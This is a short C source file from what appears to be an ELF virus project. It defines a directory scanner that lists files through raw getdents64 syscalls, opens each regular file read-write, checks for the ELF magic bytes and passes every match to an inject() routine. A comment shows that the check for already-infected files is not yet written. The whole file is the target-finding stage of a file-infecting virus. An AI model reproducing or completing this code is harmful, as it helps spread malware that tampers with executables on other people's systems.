#include "ft_virus.h"

# define BUF_SIZE 1024

int FORCE_INLINE is_good_format(char *filename)
{
	char	buf[BUF_SIZE];
	int	fd;
	size_t	name_size;

	name_size = ft_strlen(filename);
	if (name_size + sizeof(INFESTED_DIR) > BUF_SIZE)
		return (-1);
	ft_memcpy(buf, INFESTED_DIR, sizeof(INFESTED_DIR) - 1);
	ft_memcpy(buf + sizeof(INFESTED_DIR) - 1, filename, name_size);
	buf[name_size + sizeof(INFESTED_DIR) - 1] = 0;
	fd = OPEN(buf, O_RDWR);
	if (fd < 0)
		return (-1);
	READ(fd, buf, sizeof(ELFMAG) - 1);
	if (ft_memcmp(buf, ELFMAG, sizeof(ELFMAG) - 1))
	{
		CLOSE(fd);
		return (-1);
	}
	// verify if not alread infected
	return (fd);
}

int finder(t_data data, int dir_fd)
{
	int	nread;
	int	bpos;
	struct linux_dirent64 *d;
	char	buf[BUF_SIZE];

	ft_putchar('2');
	ft_putchar('\n');
	while(1)
	{
//		ft_putchar('2');
//		ft_putchar('l');
//		ft_putchar('\n');
		nread = syscall3(SYS_GETDENT64, (u64)dir_fd, (u64)buf, (u64)BUF_SIZE);
		if (!nread || nread == -1)
			return (0);
		bpos = 0;
		while (bpos < nread)
		{
			d = (struct linux_dirent64*)(buf + bpos);
			if (d->d_type == DT_REG && (data.fd = is_good_format(d->d_name)) != -1)
				inject(data);
			bpos += d->d_reclen;
		}
	}
	return (0);
}
